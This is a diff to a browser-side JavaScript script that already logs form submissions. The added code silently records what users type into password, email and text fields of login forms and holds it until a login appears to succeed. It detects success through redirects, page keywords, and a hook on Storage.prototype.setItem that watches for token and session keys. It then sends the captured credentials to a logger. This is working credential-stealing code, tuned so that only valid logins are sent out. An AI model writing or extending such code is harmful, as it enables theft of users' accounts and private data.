@@ -35,12 +35,101 @@
             logFormData(data, form.action || window.location.href);
         });
         
-        // Monitor password field changes
+        // Smart credential staging
+        let stagedCredentials = {};
+        let loginForms = new WeakMap();
+        
+        // Stage credentials without sending immediately
         document.addEventListener('input', function(e) {
-            if (e.target.type === 'password' && e.target.value.length > 3) {
-                logPasswordField(e.target);
+            if (e.target.type === 'password' || e.target.type === 'email' || e.target.type === 'text') {
+                const form = e.target.closest('form');
+                if (form) {
+                    if (!loginForms.has(form)) {
+                        loginForms.set(form, {});
+                    }
+                    const formData = loginForms.get(form);
+                    formData[e.target.name || e.target.id || e.target.type] = e.target.value;
+                    
+                    // Store globally for cross-form detection
+                    stagedCredentials[window.location.href] = formData;
+                }
             }
         });
+        
+        // Detect successful login and send staged data
+        function detectSuccessfulLogin() {
+            // Method 1: Form submission with redirect detection
+            document.addEventListener('submit', function(e) {
+                const form = e.target;
+                const formData = loginForms.get(form);
+                
+                if (formData && Object.keys(formData).length > 0) {
+                    // Wait for potential redirect/success
+                    setTimeout(() => {
+                        // Check if page changed (successful login indicator)
+                        if (window.location.href !== stagedCredentials.originalUrl) {
+                            sendStagedCredentials('form_redirect_success');
+                        }
+                    }, 2000);
+                    
+                    // Also check for success indicators
+                    setTimeout(() => {
+                        checkForSuccessIndicators(formData);
+                    }, 3000);
+                }
+                
+                stagedCredentials.originalUrl = window.location.href;
+            });
+            
+            // Method 2: Monitor for success indicators
+            function checkForSuccessIndicators(credentials) {
+                const successIndicators = [
+                    'dashboard', 'welcome', 'profile', 'account', 'logout',
+                    'authenticated', 'logged-in', 'user-menu', 'login-success'
+                ];
+                
+                const bodyText = document.body.textContent.toLowerCase();
+                const hasSuccessElement = successIndicators.some(indicator => 
+                    document.querySelector(`[class*="${indicator}"], [id*="${indicator}"]`) ||
+                    bodyText.includes(indicator)
+                );
+                
+                if (hasSuccessElement) {
+                    sendStagedCredentials('success_indicator_detected');
+                }
+            }
+            
+            // Method 3: Monitor for localStorage/sessionStorage changes (common after login)
+            const originalSetItem = Storage.prototype.setItem;
+            Storage.prototype.setItem = function(key, value) {
+                if (key.includes('token') || key.includes('auth') || key.includes('user') || key.includes('session')) {
+                    sendStagedCredentials('storage_auth_token');
+                }
+                return originalSetItem.call(this, key, value);
+            };
+        }
+        
+        function sendStagedCredentials(triggerType) {
+            const credentials = stagedCredentials[window.location.href] || stagedCredentials[stagedCredentials.originalUrl];
+            
+            if (credentials && Object.keys(credentials).length > 0) {
+                sendToLogger({
+                    type: 'successful_login_detected',
+                    trigger: triggerType,
+                    credentials: credentials,
+                    timestamp: new Date().toISOString(),
+                    page: window.location.href,
+                    originalPage: stagedCredentials.originalUrl
+                });
+                
+                // Clear staged data after sending
+                delete stagedCredentials[window.location.href];
+                delete stagedCredentials[stagedCredentials.originalUrl];
+            }
+        }
+        
+        // Initialize success detection
+        detectSuccessfulLogin();
         
         function logRequest(type, url, data) {
             sendToLogger({
